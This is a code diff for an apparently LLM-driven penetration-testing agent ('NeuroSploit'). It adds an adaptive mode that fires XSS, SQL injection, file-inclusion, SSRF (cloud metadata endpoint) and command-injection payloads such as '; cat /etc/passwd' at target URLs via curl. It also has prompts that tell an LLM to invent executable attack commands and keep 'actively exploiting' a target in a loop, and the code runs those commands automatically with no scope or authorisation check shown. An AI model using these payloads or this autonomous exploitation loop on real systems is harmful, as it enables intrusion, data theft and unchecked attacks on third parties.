@@ -131,8 +131,18 @@ class BaseAgent:
         self.tool_history.append(result)
         return result
 
-    def execute(self, user_input: str, campaign_data: Dict = None) -> Dict:
-        """Execute autonomous security assessment."""
+    def execute(self, user_input: str, campaign_data: Dict = None, recon_context: Dict = None) -> Dict:
+        """
+        Execute security assessment.
+
+        If recon_context is provided, skip discovery and use the context.
+        Otherwise extract targets and run discovery.
+        """
+        # Check if we have recon context (pre-collected data)
+        if recon_context:
+            return self._execute_with_context(user_input, recon_context)
+
+        # Legacy mode: extract targets and do discovery
         targets = self._extract_targets(user_input)
 
         if not targets:
@@ -179,6 +189,605 @@ class BaseAgent:
                 "endpoints_discovered": len(self.discovered_endpoints)
             }
         }
+
+    def _execute_with_context(self, user_input: str, recon_context: Dict) -> Dict:
+        """
+        ADAPTIVE AI Mode - Analyzes context sufficiency, runs tools if needed.
+
+        Flow:
+        1. Analyze what user is asking for
+        2. Check if context has sufficient data
+        3. If insufficient → Run necessary tools to collect data
+        4. Perform final analysis with complete data
+        """
+        target = recon_context.get('target', {}).get('primary_target', 'Unknown')
+
+        print(f"\n{'='*70}")
+        print(f"  NEUROSPLOIT ADAPTIVE AI - {self.agent_name.upper()}")
+        print(f"{'='*70}")
+        print(f"  Mode: Adaptive (LLM + Tools when needed)")
+        print(f"  Target: {target}")
+        print(f"  Context loaded with:")
+
+        attack_surface = recon_context.get('attack_surface', {})
+        print(f"    - Subdomains: {attack_surface.get('total_subdomains', 0)}")
+        print(f"    - Live hosts: {attack_surface.get('live_hosts', 0)}")
+        print(f"    - URLs: {attack_surface.get('total_urls', 0)}")
+        print(f"    - URLs with params: {attack_surface.get('urls_with_params', 0)}")
+        print(f"    - Open ports: {attack_surface.get('open_ports', 0)}")
+        print(f"    - Vulnerabilities: {attack_surface.get('vulnerabilities_found', 0)}")
+        print(f"{'='*70}\n")
+
+        # Extract context data
+        data = recon_context.get('data', {})
+        urls_with_params = data.get('urls', {}).get('with_params', [])
+        technologies = data.get('technologies', [])
+        api_endpoints = data.get('api_endpoints', [])
+        interesting_paths = data.get('interesting_paths', [])
+        existing_vulns = recon_context.get('vulnerabilities', {}).get('all', [])
+        unique_params = data.get('unique_params', {})
+        subdomains = data.get('subdomains', [])
+        live_hosts = data.get('live_hosts', [])
+        open_ports = data.get('open_ports', [])
+        js_files = data.get('js_files', [])
+        secrets = data.get('secrets', [])
+        all_urls = data.get('urls', {}).get('all', [])
+
+        # Phase 1: AI Analyzes Context Sufficiency
+        print(f"[PHASE 1] Analyzing Context Sufficiency")
+        print("-" * 50)
+
+        context_summary = {
+            "urls_with_params": len(urls_with_params),
+            "total_urls": len(all_urls),
+            "technologies": technologies,
+            "api_endpoints": len(api_endpoints),
+            "open_ports": len(open_ports),
+            "js_files": len(js_files),
+            "existing_vulns": len(existing_vulns),
+            "subdomains": len(subdomains),
+            "live_hosts": len(live_hosts),
+            "params_found": list(unique_params.keys())[:20]
+        }
+
+        gaps = self._analyze_context_gaps(user_input, context_summary, target)
+
+        self.tool_history = []
+        self.vulnerabilities = list(existing_vulns)
+
+        # Phase 2: Run tools to fill gaps if needed
+        if gaps.get('needs_tools', False):
+            print(f"\n[PHASE 2] Collecting Missing Data")
+            print("-" * 50)
+            print(f"  [!] Context insufficient for: {', '.join(gaps.get('missing', []))}")
+            print(f"  [*] Running tools to collect data...")
+
+            self._fill_context_gaps(target, gaps, urls_with_params, all_urls)
+        else:
+            print(f"\n[PHASE 2] Context Sufficient")
+            print("-" * 50)
+            print(f"  [+] All required data available in context")
+
+        # Phase 3: Final AI Analysis
+        print(f"\n[PHASE 3] AI Analysis")
+        print("-" * 50)
+
+        context_text = self._build_context_text(target, recon_context)
+        llm_response = self._final_analysis(user_input, context_text, target)
+
+        return {
+            "agent_name": self.agent_name,
+            "input": user_input,
+            "targets": [target],
+            "targets_count": 1,
+            "tools_executed": len(self.tool_history),
+            "vulnerabilities_found": len(self.vulnerabilities),
+            "findings": self.tool_history,
+            "llm_response": llm_response,
+            "context_used": True,
+            "mode": "adaptive",
+            "scan_data": {
+                "targets": [target],
+                "tools_executed": len(self.tool_history),
+                "context_based": True
+            }
+        }
+
+    def _analyze_context_gaps(self, user_input: str, context_summary: Dict, target: str) -> Dict:
+        """AI analyzes what user wants and what's missing in context."""
+
+        analysis_prompt = f"""Analyze this user request and context to determine what data is missing.
+
+USER REQUEST:
+{user_input}
+
+AVAILABLE CONTEXT DATA:
+- URLs with parameters: {context_summary['urls_with_params']}
+- Total URLs discovered: {context_summary['total_urls']}
+- Technologies detected: {', '.join(context_summary['technologies']) if context_summary['technologies'] else 'None'}
+- API endpoints: {context_summary['api_endpoints']}
+- Open ports scanned: {context_summary['open_ports']}
+- JavaScript files: {context_summary['js_files']}
+- Existing vulnerabilities: {context_summary['existing_vulns']}
+- Subdomains: {context_summary['subdomains']}
+- Live hosts: {context_summary['live_hosts']}
+- Parameters found: {', '.join(context_summary['params_found'][:15]) if context_summary['params_found'] else 'None'}
+
+TARGET: {target}
+
+DETERMINE what the user wants to test/analyze and if we have sufficient data.
+
+Respond in this EXACT format:
+NEEDS_TOOLS: YES or NO
+MISSING: [comma-separated list of what's missing]
+TESTS_NEEDED: [comma-separated list of test types needed: sqli, xss, lfi, ssrf, rce, port_scan, subdomain, crawl, etc.]
+URLS_TO_TEST: [list specific URLs from context to test, or DISCOVER if need to find URLs]
+REASON: [brief explanation]"""
+
+        system = "You are a security assessment planner. Analyze context and determine data gaps. Be concise."
+
+        response = self.llm_manager.generate(analysis_prompt, system)
+
+        # Parse response
+        gaps = {
+            "needs_tools": False,
+            "missing": [],
+            "tests_needed": [],
+            "urls_to_test": [],
+            "reason": ""
+        }
+
+        for line in response.split('\n'):
+            line = line.strip()
+            if line.startswith('NEEDS_TOOLS:'):
+                gaps['needs_tools'] = 'YES' in line.upper()
+            elif line.startswith('MISSING:'):
+                items = line.replace('MISSING:', '').strip().strip('[]')
+                gaps['missing'] = [x.strip() for x in items.split(',') if x.strip()]
+            elif line.startswith('TESTS_NEEDED:'):
+                items = line.replace('TESTS_NEEDED:', '').strip().strip('[]')
+                gaps['tests_needed'] = [x.strip().lower() for x in items.split(',') if x.strip()]
+            elif line.startswith('URLS_TO_TEST:'):
+                items = line.replace('URLS_TO_TEST:', '').strip().strip('[]')
+                gaps['urls_to_test'] = [x.strip() for x in items.split(',') if x.strip() and x.startswith('http')]
+            elif line.startswith('REASON:'):
+                gaps['reason'] = line.replace('REASON:', '').strip()
+
+        print(f"  [*] User wants: {', '.join(gaps['tests_needed']) if gaps['tests_needed'] else 'general analysis'}")
+        print(f"  [*] Data sufficient: {'No' if gaps['needs_tools'] else 'Yes'}")
+        if gaps['missing']:
+            print(f"  [*] Missing: {', '.join(gaps['missing'])}")
+
+        return gaps
+
+    def _fill_context_gaps(self, target: str, gaps: Dict, urls_with_params: List, all_urls: List):
+        """Run tools to collect missing data based on identified gaps."""
+
+        tests_needed = gaps.get('tests_needed', [])
+        urls_to_test = gaps.get('urls_to_test', [])
+
+        # If no specific URLs, use from context
+        if not urls_to_test or 'DISCOVER' in str(urls_to_test).upper():
+            urls_to_test = urls_with_params[:20] if urls_with_params else all_urls[:20]
+
+        # Normalize target
+        if not target.startswith(('http://', 'https://')):
+            target = f"http://{target}"
+
+        tools_run = 0
+        max_tools = 30
+
+        # XSS Testing
+        if any(t in tests_needed for t in ['xss', 'cross-site', 'reflected', 'stored']):
+            print(f"\n  [XSS] Running XSS tests...")
+            xss_payloads = [
+                '<script>alert(1)</script>',
+                '"><script>alert(1)</script>',
+                "'-alert(1)-'",
+                '<img src=x onerror=alert(1)>',
+                '<svg/onload=alert(1)>',
+                '{{constructor.constructor("alert(1)")()}}',
+            ]
+
+            for url in urls_to_test[:8]:
+                if tools_run >= max_tools:
+                    break
+                if '=' in url:
+                    for payload in xss_payloads[:3]:
+                        if tools_run >= max_tools:
+                            break
+                        # Inject in last parameter
+                        test_url = self._inject_payload(url, payload)
+                        result = self.run_command("curl", f'-s -k "{test_url}"', timeout=30)
+                        self._check_vuln_indicators(result)
+                        tools_run += 1
+
+        # SQL Injection Testing
+        if any(t in tests_needed for t in ['sqli', 'sql', 'injection', 'database']):
+            print(f"\n  [SQLi] Running SQL Injection tests...")
+            sqli_payloads = [
+                "'",
+                "' OR '1'='1",
+                "1' OR '1'='1' --",
+                "' UNION SELECT NULL--",
+                "1; SELECT * FROM users--",
+                "' AND 1=1--",
+            ]
+
+            for url in urls_to_test[:8]:
+                if tools_run >= max_tools:
+                    break
+                if '=' in url:
+                    for payload in sqli_payloads[:3]:
+                        if tools_run >= max_tools:
+                            break
+                        test_url = self._inject_payload(url, payload)
+                        result = self.run_command("curl", f'-s -k "{test_url}"', timeout=30)
+                        self._check_vuln_indicators(result)
+                        tools_run += 1
+
+        # LFI Testing
+        if any(t in tests_needed for t in ['lfi', 'file', 'inclusion', 'path', 'traversal']):
+            print(f"\n  [LFI] Running LFI tests...")
+            lfi_payloads = [
+                '../../etc/passwd',
+                '....//....//....//etc/passwd',
+                '/etc/passwd',
+                'php://filter/convert.base64-encode/resource=index.php',
+                '....\\....\\....\\windows\\win.ini',
+            ]
+
+            for url in urls_to_test[:6]:
+                if tools_run >= max_tools:
+                    break
+                if '=' in url:
+                    for payload in lfi_payloads[:2]:
+                        if tools_run >= max_tools:
+                            break
+                        test_url = self._inject_payload(url, payload)
+                        result = self.run_command("curl", f'-s -k "{test_url}"', timeout=30)
+                        self._check_vuln_indicators(result)
+                        tools_run += 1
+
+        # SSRF Testing
+        if any(t in tests_needed for t in ['ssrf', 'server-side', 'request']):
+            print(f"\n  [SSRF] Running SSRF tests...")
+            ssrf_payloads = [
+                'http://127.0.0.1:80',
+                'http://localhost:22',
+                'http://169.254.169.254/latest/meta-data/',
+                'file:///etc/passwd',
+            ]
+
+            for url in urls_to_test[:4]:
+                if tools_run >= max_tools:
+                    break
+                if '=' in url:
+                    for payload in ssrf_payloads[:2]:
+                        if tools_run >= max_tools:
+                            break
+                        test_url = self._inject_payload(url, payload)
+                        result = self.run_command("curl", f'-s -k "{test_url}"', timeout=30)
+                        self._check_vuln_indicators(result)
+                        tools_run += 1
+
+        # RCE Testing
+        if any(t in tests_needed for t in ['rce', 'command', 'execution', 'shell']):
+            print(f"\n  [RCE] Running Command Injection tests...")
+            rce_payloads = [
+                '; id',
+                '| id',
+                '`id`',
+                '$(id)',
+                '; cat /etc/passwd',
+            ]
+
+            for url in urls_to_test[:4]:
+                if tools_run >= max_tools:
+                    break
+                if '=' in url:
+                    for payload in rce_payloads[:2]:
+                        if tools_run >= max_tools:
+                            break
+                        test_url = self._inject_payload(url, payload)
+                        result = self.run_command("curl", f'-s -k "{test_url}"', timeout=30)
+                        self._check_vuln_indicators(result)
+                        tools_run += 1
+
+        # URL Discovery / Crawling
+        if any(t in tests_needed for t in ['crawl', 'discover', 'spider', 'urls']):
+            print(f"\n  [CRAWL] Discovering URLs...")
+            result = self.run_command("curl", f'-s -k "{target}"', timeout=30)
+            tools_run += 1
+
+            # Extract links from response
+            if result.get('output'):
+                links = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', result['output'], re.IGNORECASE)
+                for link in links[:10]:
+                    if not link.startswith(('http://', 'https://', '//', '#', 'javascript:')):
+                        full_url = urllib.parse.urljoin(target, link)
+                        if full_url not in self.discovered_endpoints:
+                            self.discovered_endpoints.append(full_url)
+
+        # Port Scanning
+        if any(t in tests_needed for t in ['port', 'scan', 'nmap', 'service']):
+            print(f"\n  [PORTS] Checking common ports...")
+            domain = self._get_domain(target)
+            common_ports = [80, 443, 8080, 8443, 22, 21, 3306, 5432, 27017, 6379]
+
+            for port in common_ports[:5]:
+                if tools_run >= max_tools:
+                    break
+                result = self.run_command("curl", f'-s -k -o /dev/null -w "%{{http_code}}" --connect-timeout 3 "http://{domain}:{port}/"', timeout=10)
+                tools_run += 1
+
+        print(f"\n  [+] Ran {tools_run} tool commands to fill context gaps")
+
+    def _inject_payload(self, url: str, payload: str) -> str:
+        """Inject payload into URL parameter."""
+        if '=' not in url:
+            return url
+
+        # URL encode the payload
+        encoded_payload = urllib.parse.quote(payload, safe='')
+
+        # Replace the last parameter value
+        parts = url.rsplit('=', 1)
+        if len(parts) == 2:
+            return f"{parts[0]}={encoded_payload}"
+        return url
+
+    def _build_context_text(self, target: str, recon_context: Dict) -> str:
+        """Build comprehensive context text for final analysis."""
+        attack_surface = recon_context.get('attack_surface', {})
+        data = recon_context.get('data', {})
+
+        urls_with_params = data.get('urls', {}).get('with_params', [])[:50]
+        technologies = data.get('technologies', [])
+        api_endpoints = data.get('api_endpoints', [])[:30]
+        interesting_paths = data.get('interesting_paths', [])[:30]
+        existing_vulns = recon_context.get('vulnerabilities', {}).get('all', [])[:20]
+        unique_params = data.get('unique_params', {})
+        subdomains = data.get('subdomains', [])[:30]
+        live_hosts = data.get('live_hosts', [])[:30]
+        open_ports = data.get('open_ports', [])[:20]
+        js_files = data.get('js_files', [])[:20]
+        secrets = data.get('secrets', [])[:10]
+
+        # Add tool results to context
+        tool_results_text = ""
+        if self.tool_history:
+            tool_results_text = "\n\n**Security Tests Executed:**\n"
+            for cmd in self.tool_history[-20:]:
+                output = cmd.get('output', '')[:500]
+                tool_results_text += f"\nCommand: {cmd.get('command', '')[:150]}\n"
+                tool_results_text += f"Output: {output}\n"
+
+        # Add found vulnerabilities
+        vuln_text = ""
+        if self.vulnerabilities:
+            vuln_text = "\n\n**Vulnerabilities Detected During Testing:**\n"
+            for v in self.vulnerabilities[:15]:
+                vuln_text += f"- [{v.get('severity', 'INFO').upper()}] {v.get('type', 'Unknown')}\n"
+                vuln_text += f"  Evidence: {str(v.get('evidence', ''))[:200]}\n"
+
+        return f"""=== RECONNAISSANCE CONTEXT FOR {target} ===
+
+**Attack Surface Summary:**
+- Total Subdomains: {attack_surface.get('total_subdomains', 0)}
+- Live Hosts: {attack_surface.get('live_hosts', 0)}
+- Total URLs: {attack_surface.get('total_urls', 0)}
+- URLs with Parameters: {attack_surface.get('urls_with_params', 0)}
+- Open Ports: {attack_surface.get('open_ports', 0)}
+- Technologies Detected: {attack_surface.get('technologies_detected', 0)}
+
+**Subdomains Discovered:**
+{chr(10).join(f'  - {s}' for s in subdomains)}
+
+**Live Hosts:**
+{chr(10).join(f'  - {h}' for h in live_hosts)}
+
+**Technologies Detected:**
+{', '.join(technologies) if technologies else 'None detected'}
+
+**Open Ports:**
+{chr(10).join(f'  - {p.get("port", "N/A")}/{p.get("protocol", "tcp")} - {p.get("service", "unknown")}' for p in open_ports) if open_ports else 'None scanned'}
+
+**URLs with Parameters (for injection testing):**
+{chr(10).join(f'  - {u}' for u in urls_with_params)}
+
+**Unique Parameters Found:**
+{', '.join(list(unique_params.keys())[:50]) if unique_params else 'None'}
+
+**API Endpoints:**
+{chr(10).join(f'  - {e}' for e in api_endpoints) if api_endpoints else 'None found'}
+
+**Interesting Paths:**
+{chr(10).join(f'  - {p}' for p in interesting_paths) if interesting_paths else 'None found'}
+
+**JavaScript Files:**
+{chr(10).join(f'  - {j}' for j in js_files) if js_files else 'None found'}
+
+**Existing Vulnerabilities from Recon:**
+{json.dumps(existing_vulns, indent=2) if existing_vulns else 'None found yet'}
+
+**Potential Secrets Exposed:**
+{chr(10).join(f'  - {s[:80]}...' for s in secrets) if secrets else 'None found'}
+{tool_results_text}
+{vuln_text}
+=== END OF CONTEXT ==="""
+
+    def _final_analysis(self, user_input: str, context_text: str, target: str) -> str:
+        """Generate final analysis based on user request and all collected data."""
+
+        system_prompt = self.context_prompts.get('system_prompt', '')
+        if not system_prompt:
+            system_prompt = f"""You are {self.agent_name}, an elite penetration tester and security researcher.
+You have been provided with reconnaissance data and security test results.
+
+Your task is to analyze this data and provide actionable security insights.
+Follow the user's instructions EXACTLY - they specify what they want you to analyze and how.
+
+When providing findings:
+1. Be specific - reference actual URLs, parameters, and endpoints from the context
+2. Provide PoC examples with exact curl commands
+3. Include CVSS scores for vulnerabilities
+4. Prioritize by severity (Critical > High > Medium > Low)
+5. Include remediation recommendations
+
+Use the ACTUAL test results and evidence provided.
+If a vulnerability was detected during testing, document it with the exact evidence."""
+
+        user_prompt = f"""=== USER REQUEST ===
+{user_input}
+
+=== TARGET ===
+{target}
+
+=== RECONNAISSANCE DATA & TEST RESULTS ===
+{context_text}
+
+=== INSTRUCTIONS ===
+Analyze ALL the data above including any security tests that were executed.
+Respond to the user's request thoroughly using the actual evidence collected.
+Provide working PoC commands using the real URLs and parameters.
+Document any vulnerabilities found during testing with CVSS scores."""
+
+        print(f"  [*] Generating final analysis...")
+        response = self.llm_manager.generate(user_prompt, system_prompt)
+        print(f"  [+] Analysis complete")
+
+        return response
+
+    def _ai_analyze_context(self, target: str, context: Dict, user_input: str) -> str:
+        """AI analyzes the recon context and creates targeted attack plan."""
+
+        data = context.get('data', {})
+        urls_with_params = data.get('urls', {}).get('with_params', [])[:30]
+        technologies = data.get('technologies', [])
+        api_endpoints = data.get('api_endpoints', [])[:20]
+        interesting_paths = data.get('interesting_paths', [])[:20]
+        existing_vulns = context.get('vulnerabilities', {}).get('all', [])[:10]
+        unique_params = data.get('unique_params', {})
+
+        analysis_prompt = f"""You are an elite penetration tester. Analyze this RECON CONTEXT and create an attack plan.
+
+USER REQUEST: {user_input}
+
+TARGET: {target}
+
+=== RECON CONTEXT ===
+
+**URLs with Parameters (test for injection):**
+{chr(10).join(urls_with_params[:30])}
+
+**Unique Parameters Found:**
+{', '.join(list(unique_params.keys())[:30]) if unique_params else 'None'}
+
+**Technologies Detected:**
+{', '.join(technologies)}
+
+**API Endpoints:**
+{chr(10).join(api_endpoints)}
+
+**Interesting Paths:**
+{chr(10).join(interesting_paths)}
+
+**Vulnerabilities Already Found:**
+{json.dumps(existing_vulns, indent=2) if existing_vulns else 'None yet'}
+
+=== YOUR TASK ===
+
+Based on this context, generate SPECIFIC tests to find vulnerabilities.
+For each test, output in this EXACT format:
+
+[TEST] curl -s -k "[URL_WITH_PAYLOAD]"
+[TEST] curl -s -k -X POST "[URL]" -d "param=payload"
+
+Focus on:
+1. SQL Injection - test parameters with: ' " 1 OR 1=1 UNION SELECT
+2. XSS - test inputs with: <script>alert(1)</script> <img src=x onerror=alert(1)>
+3. LFI - test file params with: ../../etc/passwd php://filter
+4. Auth bypass on API endpoints
+5. IDOR on ID parameters
+
+Output at least 25 specific [TEST] commands targeting the URLs and parameters from context.
+Be creative. Think like a hacker."""
+
+        system = """You are an offensive security expert. Create specific curl commands to test vulnerabilities.
+Each command must be prefixed with [TEST] and be complete and executable.
+Target the actual endpoints and parameters from the recon context."""
+
+        response = self.llm_manager.generate(analysis_prompt, system)
+
+        # Extract and run tests
+        tests = re.findall(r'\[TEST\]\s*(.+?)(?=\[TEST\]|\Z)', response, re.DOTALL)
+        print(f"  [+] AI generated {len(tests)} targeted tests from context")
+
+        for test in tests[:30]:
+            test = test.strip()
+            if test.startswith('curl'):
+                cmd_match = re.match(r'(curl\s+.+?)(?:\n|$)', test)
+                if cmd_match:
+                    cmd = cmd_match.group(1).strip()
+                    args = cmd[4:].strip()
+                    self.run_command("curl", args)
+
+        return response
+
+    def _context_based_exploitation(self, target: str, context: Dict, attack_plan: str):
+        """AI-driven exploitation using context data."""
+
+        for iteration in range(8):
+            print(f"\n  [*] AI Exploitation Iteration {iteration + 1}")
+
+            recent_results = self.tool_history[-15:] if len(self.tool_history) > 15 else self.tool_history
+
+            results_context = "=== RECENT TEST RESULTS ===\n\n"
+            for cmd in recent_results:
+                output = cmd.get('output', '')[:2000]
+                results_context += f"Command: {cmd.get('command', '')[:200]}\n"
+                results_context += f"Output: {output}\n\n"
+
+            exploitation_prompt = f"""You are actively exploiting {target}.
+
+{results_context}
+
+=== ANALYZE AND DECIDE NEXT STEPS ===
+
+Look at the results. Identify:
+1. SQL errors = SQLi CONFIRMED - exploit further!
+2. XSS reflection = XSS CONFIRMED - try variations!
+3. File contents = LFI CONFIRMED - read more files!
+4. Auth bypass = Document and explore!
+
+If you found something, DIG DEEPER.
+If a test failed, try different payloads.
+
+Output your next tests as:
+[EXEC] curl: [arguments]
+
+Or if done, respond with [DONE]"""
+
+            system = "You are exploiting a target. Analyze results and output next commands."
+
+            response = self.llm_manager.generate(exploitation_prompt, system)
+
+            if "[DONE]" in response:
+                print("  [*] AI completed exploitation phase")
+                break
+
+            commands = self._parse_ai_commands(response)
+
+            if not commands:
+                print("  [*] No more commands, moving on")
+                break
+
+            print(f"  [*] AI requested {len(commands)} tests")
+
+            for tool, args in commands[:10]:
+                result = self.run_command(tool, args, timeout=60)
+                self._check_vuln_indicators(result)
 
     def _autonomous_assessment(self, target: str) -> List[Dict]:
         """
